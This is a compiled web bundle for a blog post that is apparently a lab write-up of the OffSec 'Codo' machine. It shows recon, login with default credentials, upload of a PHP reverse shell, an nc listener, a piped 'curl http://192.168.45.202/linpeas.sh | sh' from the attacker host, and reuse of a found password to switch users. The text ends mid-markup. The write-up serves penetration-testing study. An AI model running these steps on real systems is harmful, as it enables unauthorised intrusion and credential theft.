"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[249],{4765:function(e,n,t){t.d(n,{F:function(){return g},Z:function(){return m}});var a=t(7294),l=t(8733),i=t(795),s=t(8377),c=t(6799),o=t(8871);var r=e=>{let{post:n}=e;return null};const p=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var d=e=>{let{data:{post:n},children:t}=e;return(0,l.tZ)(s.Z,null,(0,l.tZ)(i.X6,{as:"h1",variant:"styles.h1"},n.title),(0,l.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,l.tZ)("time",null,n.date),n.tags&&(0,l.tZ)(a.Fragment,null," — ",(0,l.tZ)(c.Z,{tags:n.tags})),n.timeToRead&&" — ",n.timeToRead&&(0,l.tZ)("span",null,n.timeToRead," min read")),(0,l.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:p.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},t),(0,l.tZ)(r,{post:n}))};const g=e=>{var n,t,a;let{data:{post:i}}=e;return(0,l.tZ)(o.Z,{title:i.title,description:i.description?i.description:i.excerpt,image:i.banner?null===(n=i.banner)||void 0===n||null===(t=n.childImageSharp)||void 0===t||null===(a=t.resize)||void 0===a?void 0:a.src:void 0,pathname:i.slug,canonicalUrl:i.canonicalUrl})};function m(e){let{...n}=e;return a.createElement(d,n)}},6799:function(e,n,t){var a=t(8733),l=t(7294),i=t(1883),s=t(3494),c=t(9706);n.Z=e=>{let{tags:n}=e;const{tagsPath:t,basePath:o}=(0,s.Z)();return(0,a.tZ)(l.Fragment,null,n.map(((e,n)=>(0,a.tZ)(l.Fragment,{key:e.slug},!!n&&", ",(0,a.tZ)(i.Link,{sx:e=>{var n;return{...null===(n=e.styles)||void 0===n?void 0:n.a}},to:(0,c.Z)(`/${o}/${t}/${e.slug}`)},e.name)))))}},8871:function(e,n,t){var a=t(7294),l=t(1883),i=t(4232);n.Z=e=>{let{title:n="",description:t="",pathname:s="",image:c="",children:o=null,canonicalUrl:r=""}=e;const p=(0,i.Z)(),{siteTitle:d,siteTitleAlt:g,siteUrl:m,siteDescription:A,siteImage:u,author:b,siteLanguage:f}=p,h={title:n?`${n} | ${d}`:g,description:t||A,url:`${m}${s||""}`,image:`${m}${c||u}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:f}),a.createElement("title",null,h.title),a.createElement("meta",{name:"description",content:h.description}),a.createElement("meta",{name:"image",content:h.image}),a.createElement("meta",{property:"og:title",content:h.title}),a.createElement("meta",{property:"og:url",content:h.url}),a.createElement("meta",{property:"og:description",content:h.description}),a.createElement("meta",{property:"og:image",content:h.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:h.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:h.title}),a.createElement("meta",{name:"twitter:url",content:h.url}),a.createElement("meta",{name:"twitter:description",content:h.description}),a.createElement("meta",{name:"twitter:image",content:h.image}),a.createElement("meta",{name:"twitter:image:alt",content:h.description}),a.createElement("meta",{name:"twitter:creator",content:b}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,l.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,l.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,l.withPrefix)("/apple-touch-icon.png")}),r?a.createElement("link",{rel:"canonical",href:r}):null,o)}},1357:function(e,n,t){t.r(n),t.d(n,{Head:function(){return c.F},default:function(){return o}});var a=t(7294),l=t(1151);function i(e){const n=Object.assign({span:"span",h1:"h1",p:"p",code:"code",pre:"pre",h2:"h2",ul:"ul",li:"li",a:"a",h3:"h3"},(0,l.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 856px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 20.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA5klEQVR42j2Oa26DMBCEuUBDgFSEYh42D4MJLUhRiJSkahpVvf+JvhpX7Y/RaGdnZ9Yb9ZHH9Zt5OFPnB0w1s0w33s8P7pcvTtMVlRraYuRy/OB6ulvvQien33n5ZJlvzGZBl294ZaZpq5Gq7BFJhSo6i95qB7pmpJHG6YVoadRA3746lnlHbXerb9ATtb1fNU+IhMEoUiEopSSIIlqtMYOh621wq8nzgjDaUZQlG3/rEO2e0bojeUl52vhsg9DBUzLlcrZfpAKplBPX8CzPEVnmON4nBGHk+O9wLViL4niPvw3+A38AK3hwcGcn7z4AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/b39ba61964faacc2424ea94acc9bc757/f7ecb/info.png"\n        srcset="/static/b39ba61964faacc2424ea94acc9bc757/5243c/info.png 240w,\n/static/b39ba61964faacc2424ea94acc9bc757/ab158/info.png 480w,\n/static/b39ba61964faacc2424ea94acc9bc757/f7ecb/info.png 856w"\n        sizes="(max-width: 856px) 100vw, 856px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.h1,null,"Recon"),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 902px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA/klEQVR42n2QzW7DIBCE/Wq95Fqlkf8NGAgGG5nEqZNGUX+eoNdeeuqTTtdYqqoeevikXZadGUh2VYu7zQb3aQXjA/owIW1apLVYWepfZExGcq5Qthql0CiEirttNyApOcPX5xuErODCIw7nJ7C9Azc9BNFo+9MvdUECOVFLA9n1kLYnIQczjBDUJ50p8PFuMfoG0gVo5+HGiZKeYCnt4uyPczTS/YicKRScRIk1rUJGadNGxlmSMo1tRQd0IcwXnG8vtHxFawcw43B5foWfZpyuN9S6Q7E8U+4jFaX8S7LNavorjoe8gbIe1h8ofkCjOpRkYvoQZ7uSrxTsX74BETfW5mZE8rQAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info-comm"\n        title=""\n        src="/static/cfcafcfc279296d782ff41b723f7393d/0dc17/info-comm.png"\n        srcset="/static/cfcafcfc279296d782ff41b723f7393d/5243c/info-comm.png 240w,\n/static/cfcafcfc279296d782ff41b723f7393d/ab158/info-comm.png 480w,\n/static/cfcafcfc279296d782ff41b723f7393d/0dc17/info-comm.png 902w"\n        sizes="(max-width: 902px) 100vw, 902px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nThis machine has a Linux OS and is also rated easy by the community."),"\n",a.createElement(n.p,null,"Remember to make an entry for the IP in ",a.createElement(n.code,null,"/etc/hosts")," file. My entry looks like:"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"192.168.183.23  codo.offsec\n")),"\n",a.createElement(n.h2,null,"Nmap"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"nmap -p- --open -sC -sV codo.offsec\n")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-p-"),": Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"--open"),": Displays only open ports, indicating which services are active and accessible."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-sC"),": Performs default script scanning, which runs a set of scripts to gather additional information about the target."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-sV"),": Enables version detection, providing information about the versions of services running on open ports.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABYlAAAWJQFJUiTwAAABGElEQVR42oVR2XLCMBDLp7RAIPflHI5zEQJ00uH/f0e1toSHdjp90NjW2rJW63TDHY25YDivaLsr8nKAsdw0fyKIasSZRpg0iBKNKNXCJZmBH1ZyjrNWzqGtH30FJ4hrdOMHxnlF2ZwRp62I5mpAUY5Q9SQ81zTvpFbpWbjDKYfrFS/sjxkFG2jrzPQ3ccY93fb2k7a7Cd+Pd8zXh3W9yh3W5uUB37p928d4PySCnZvC0WYRd7wk7bcX2ZMjWCeqp3vXy+UhQUfbfoOTqV5+ZY5spWkXMAbPZsT2mB8f0gHd/BT4JXgKFNi2ebrzglLyYMAU2Fr6T+glmNigGXZj26qtoKqm75VDKDqZYmynSCS5sVwvw/jrky+Fud4d0rnxMgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/6b0dd8b988583834f2b33f1852984181/7d769/nmap.png"\n        srcset="/static/6b0dd8b988583834f2b33f1852984181/5243c/nmap.png 240w,\n/static/6b0dd8b988583834f2b33f1852984181/ab158/nmap.png 480w,\n/static/6b0dd8b988583834f2b33f1852984181/7d769/nmap.png 960w,\n/static/6b0dd8b988583834f2b33f1852984181/850cc/nmap.png 1226w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.p,null,"The nmap scan discovered a web application"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Browse to ",a.createElement(n.code,null,"http://codo/")," and we can see that the website is ",a.createElement(n.code,null,"Powered by Codoforum")),"\n"),"\n",a.createElement(n.h2,null,"Gobuster"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"gobuster dir -u codo.offsec/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt \n")),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 17.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA7UlEQVR42i2O0XKCMBBF+ZBqREGZqtAEDVWUQBQiqO20/f9vOY22D2d2Z/bOnhu4/otcG/LtP5uKvLCo5gNlrqjjQO7nub1TNQPn7pP3Y4/cOdThRl5ekfsbs9QSrhuCsnKEUco4XCGmaybhErFQjLRj9GZ4yQzhtqWuL09xbQdelWWUlIi0RawsIusIZe8ZCPTOMptnxIkiWkiiOCNaaqaFI9Yt0cabpWFfnpC+feHzSXpgPNdMVg1iaRBrn3k8zVoC139zMI7mfMd4+9FcsH6v/N5df+j8fVM0nvrJo6XyyO0fStdPUZTkTGPJL9DZgzaPwx50AAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="gobuster"\n        title=""\n        src="/static/9cd083621b2fb3931eb8b85c2fe1ac42/7d769/gobuster.png"\n        srcset="/static/9cd083621b2fb3931eb8b85c2fe1ac42/5243c/gobuster.png 240w,\n/static/9cd083621b2fb3931eb8b85c2fe1ac42/ab158/gobuster.png 480w,\n/static/9cd083621b2fb3931eb8b85c2fe1ac42/7d769/gobuster.png 960w,\n/static/9cd083621b2fb3931eb8b85c2fe1ac42/d60d7/gobuster.png 1074w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nThe gobuster scan found an admin panel at ",a.createElement(n.code,null,"/admin/")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"The default credentials ",a.createElement(n.code,null,"admin:admin")," can be used to log in"),"\n"),"\n",a.createElement(n.h2,null,"Searchsploit"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"searchsploit codoforum\n")),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 22.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA0ElEQVR42j2QSw7CMAxEewt2CCj0S0NCmraUtBD+CBAL7n+WwTGoiyfL9mgycSCUhawccrWFILKiQpobpMsKcaaJ8o8eiNI17Q3pWyR5SRjW+HnwHMe4RALS9NjYM5rtCWW9h9QW81gNLJL1QEi9kC0Opxd6d0e3uyGjAF4XfEYTPGc5pdzxwvZXWKptd0HTHlno04aRxGyxYiZhwYa3xwfn6xvu+OCU07lA4BKFvaihKVVNBqrsoMnc40+Q/g1/X9KMT5kVNT9oGsdafyY//wKOgX8FAYkm4gAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="searchsploit"\n        title=""\n        src="/static/eb0fd1494545badafd4e6138dc86eb8c/7d769/searchsploit.png"\n        srcset="/static/eb0fd1494545badafd4e6138dc86eb8c/5243c/searchsploit.png 240w,\n/static/eb0fd1494545badafd4e6138dc86eb8c/ab158/searchsploit.png 480w,\n/static/eb0fd1494545badafd4e6138dc86eb8c/7d769/searchsploit.png 960w,\n/static/eb0fd1494545badafd4e6138dc86eb8c/87339/searchsploit.png 1440w,\n/static/eb0fd1494545badafd4e6138dc86eb8c/5ddef/searchsploit.png 1786w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nSearchsploit returns a couple scripts, but the remote code execution python script looks the most interesting, download the script using:"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"searchsploit -m php/webapps/50978.py\n")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"looking at this script shows the following URL location that allows for file upload\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 12.5%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAuklEQVR42i3P207CQBSF4T6J0NMc9rTToe0IDYXGSPCAiolXvv+D/I7oxZe1sm52dhbHyEaEGLf0IXDfeeY40ltDtIrFC5MoHjphbgzH1hDqgqZYJ/mfco3LV+SrO7KX05nTfs/5cORx2vG0LLweZt6myGU78ByES7B87zo+B8fX2HDtXSK3/rERrml/95qoCjIXerTSGGOxPqBTtpI4oUrXbVngVUX7z9UlwdS3/pteV3S6ZkjfNKriB6jlXZeBoidDAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="urlUpload"\n        title=""\n        src="/static/a56ef73bc4f6b2d075e91f0f8fde410f/7d769/urlUpload.png"\n        srcset="/static/a56ef73bc4f6b2d075e91f0f8fde410f/5243c/urlUpload.png 240w,\n/static/a56ef73bc4f6b2d075e91f0f8fde410f/ab158/urlUpload.png 480w,\n/static/a56ef73bc4f6b2d075e91f0f8fde410f/7d769/urlUpload.png 960w,\n/static/a56ef73bc4f6b2d075e91f0f8fde410f/463a7/urlUpload.png 1170w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.li,null,"when going to the URL in the browser, we are indeed able to upload an image file"),"\n"),"\n",a.createElement(n.h1,null,"Exploitation"),"\n",a.createElement(n.p,null,"Let's run the script found from searchsploit. The format for the flags are shown below."),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"python3 exploit.py -t [target url] -u [username] -p [password] -i [listener ip] -n [listener port]\n")),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 897px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 33.75%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABJ0lEQVR42m1R23aCMBDkW6pW8RIIgRADCiGg1rb//znT3ZVezqkPc2YyJJPZkCh3hW2vCOMnChtQHSPqZoL1I7TtUblIHKDMCfu8gS47qIK0brDLjlilJV631Q+Ssu6xU0fk5RkH3RIaZKQzCmCPQ5jTfY304LDeWTm42ph/YRLINxtqUlS9HDR1oKY9ShfEz6kRe9zY+iiaGz4Lk8CMPir9aKGrTppp0rxWRTu3fjRn3tI03PRZmASmvIGwzTy9iZfN8j406su6wIJGE6wNrWe9KbFMf7FgzF4S4weGcMcwvMPSe1rboSLUPLJpoZRDlnvkfyAe/RCGmvHtJ1N/wy3ecSEezxdM3VX4NryJ7v2AeJ7Ee/CEeBoxdheENop3qjs408Brhy+SU+IckSt6pwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="firstrun"\n        title=""\n        src="/static/daaede6dc1a65a1a624f4040288860b7/42ccd/firstrun.png"\n        srcset="/static/daaede6dc1a65a1a624f4040288860b7/5243c/firstrun.png 240w,\n/static/daaede6dc1a65a1a624f4040288860b7/ab158/firstrun.png 480w,\n/static/daaede6dc1a65a1a624f4040288860b7/42ccd/firstrun.png 897w"\n        sizes="(max-width: 897px) 100vw, 897px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.p,null,"Unfortunately, the script does not run correctly and fails in uploading the script."),"\n",a.createElement(n.p,null,"We can manually upload a PHP script as shown by the output."),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,a.createElement(n.a,{href:"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"},"Use this PHP reverse shell")),"\n",a.createElement(n.li,null,"make sure to change the IP to the kali host and port number in the reverse shell php script\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 483px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZElEQVR42mWSaXLbMAxGc5EmJiWS4iaaomhttRZ3svT+B/oKyZ62SX68GQ6GeAQBPBnjUAiBtsu4jD2u24zYBOR8Rooa1kq8nDgYJxjH6cTu7OcdivP/eNLWo9EKr+uG7brgbZmxnh0+ksd7W2OpDUarEEWBpAr0QaKvJS5eoPMSSXAUn4TOYzAK27KhyxdkLfA2Jaw5oJElBleRQCPHCuNA8t5imhyiFQjEIDlKfv/BITQktEpiIeG83DBeeizzjNY73H5mjG2AKxjOVYGoSwSqNMgCNcU8Z3Dlly8b61BKifO0oB6uB4oeKdMVwgXqEcMzI053fjx4pv698DufhJaSBQmbaUXsJ/gmwRmDNnfwzkFLceAqBUP3otXwujpikuDfhDQUsU95/oXu9hs+JiSacvKGkkpoJR5IVCTYZXuLFOXsed+Ezoe/Feb1FXXTog4erCiP9dhXhTH24LE27F/8q/APaVzvM60Uy7QAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="changeField"\n        title=""\n        src="/static/f8363bc0925eb1318c318178f3f9bcee/f5672/changeField.png"\n        srcset="/static/f8363bc0925eb1318c318178f3f9bcee/5243c/changeField.png 240w,\n/static/f8363bc0925eb1318c318178f3f9bcee/ab158/changeField.png 480w,\n/static/f8363bc0925eb1318c318178f3f9bcee/f5672/changeField.png 483w"\n        sizes="(max-width: 483px) 100vw, 483px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.p,null,"Upload the php reverse shell by going to admin panel -> global settings -> scroll down to change logo for the forum.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 808px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 14.166666666666666%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAWElEQVR42p3LwQ2AIBAFUbowgiyyoCQIRmP0ogf7b+qLdiCHd5qMmHJGTKnIIMtopELb6WrivG6s244QIww7EDOkpiqKDMS8HOAhwHoPN4aPMj1kiX+93wOmvlHD2viklQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="uploadField"\n        title=""\n        src="/static/105969165721bd872626e144f88d6d9b/f6ac1/uploadField.png"\n        srcset="/static/105969165721bd872626e144f88d6d9b/5243c/uploadField.png 240w,\n/static/105969165721bd872626e144f88d6d9b/ab158/uploadField.png 480w,\n/static/105969165721bd872626e144f88d6d9b/f6ac1/uploadField.png 808w"\n        sizes="(max-width: 808px) 100vw, 808px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nThen, click the save button."),"\n",a.createElement(n.p,null,"Start a netcat listener with ",a.createElement(n.code,null,"nc -lnvp 1234")),"\n",a.createElement(n.p,null,"After uploading the script and starting a listener, the attacker can execute the uploaded script by going to ",a.createElement(n.code,null,"http://codo.offsec/sites/default/assets/img/attachments/[uploaded_filename.php]"),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 844px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyElEQVR42nWO7U6EMBBFeRh1cVf3A7aAUErLUgpdRWNMfP8nORaykvjDHydzZzJz50an0nFq3sj1K1UzkJcdaWZIMs3u8MLjc7EQP+Wr3uyylYftXMVNC6KmvaIDyniMfV8opEN3E376pu0/aMNsxo6flGpgn0gOac3xrNa66KQOhuaKDEtFSCaVQ+kRkRtKabnYiSY8UtqT3I6OqVqSbLbiT9LfPvqyHm8ctmrp5YWxsQzK4gJ9Pfc9ru6o9oL7OOUuPi+G//EDSxaFLHZsiPAAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="local"\n        title=""\n        src="/static/ad1bd11979dd11316c68b86cfd677e9a/b4e2e/local.png"\n        srcset="/static/ad1bd11979dd11316c68b86cfd677e9a/5243c/local.png 240w,\n/static/ad1bd11979dd11316c68b86cfd677e9a/ab158/local.png 480w,\n/static/ad1bd11979dd11316c68b86cfd677e9a/b4e2e/local.png 844w"\n        sizes="(max-width: 844px) 100vw, 844px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"To get a fully functional shell follow the commands below"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"python3 -c ‘import pty;pty.spawn(“/bin/bash”);’\nexport TERM=xterm\nCtrl + z\nstty raw -echo ; fg\nreset\n")),"\n",a.createElement(n.h2,null,"Privilege Escalation"),"\n",a.createElement(n.p,null,"To assess the attack surface, run ",a.createElement(n.code,null,"linpeas.sh")," on the target:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"run a python http server in the directory with the ",a.createElement(n.code,null,"linpeas.sh")," file with ",a.createElement(n.code,null,"python3 -m http.server 80")),"\n",a.createElement(n.li,null,"then use the ",a.createElement(n.code,null,"curl")," command with ",a.createElement(n.code,null,"sh")," to run the script on the target machine"),"\n",a.createElement(n.li,null,"the IP specified is downloading from my Kali host"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"curl http://192.168.45.202/linpeas.sh | sh\n")),"\n",a.createElement(n.h3,null,"Linpeas Results"),"\n",a.createElement(n.p,null,"From the scan results, we find a config PHP file with a password in it.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 580px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 8.75%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgUlEQVR42h2MVw6DMBQEuU2KjQEl2JgS000J9z/O5Ckfq9GOVpvc3cHNXTzDhVlPiXA+SZcvZrvQIaK7BTXu6HEjDzNmiCjxj9ShMo/Oa5Tx/57U/Yltd2y3YT8R1+/44aDsIjaIEzbSMz/xyhyTzmkaOXUDpmgpqwkvm6pdKd6BHzQEQ3Xd5KpBAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="foundPass"\n        title=""\n        src="/static/0f3fc247855bc52d883f1697ca33317a/065c3/foundPass.png"\n        srcset="/static/0f3fc247855bc52d883f1697ca33317a/5243c/foundPass.png 240w,\n/static/0f3fc247855bc52d883f1697ca33317a/ab158/foundPass.png 480w,\n/static/0f3fc247855bc52d883f1697ca33317a/065c3/foundPass.png 580w"\n        sizes="(max-width: 580px) 100vw, 580px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"We can try to log in to other users on the machine using this password"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"linpeas found two other users, ",a.createElement(n.code,null,"root")," and ",a.createElement(n.code,null,"offsec")),"\n",a.createElement(n.li,null,"use the ",a.createElement(n.code,null,"su")," command and try password ",a.createElement(n.code,null,"FatPanda123"),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 468px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 14.166666666666666%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAo0lEQVR42m2O6Q6CMBCEeRMTD240CLRc5RDKoRT/GI2+/3uMpYmJJv74Mjub3cloKyqwCXqsiYCeXOD1E+yygyExWQunGeEMAjYtYdoRTJfC8mKF4RDocveNtj29cChmVP0NXDxRT1LnO445R9pM6K4PNNIzOZO0VWTFgLw6w49K7KzwN5C5ASJ5lGRcEZIa8eJTDip1gRUj9n6unpdW/5p9At8gSGMXH0NMRgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        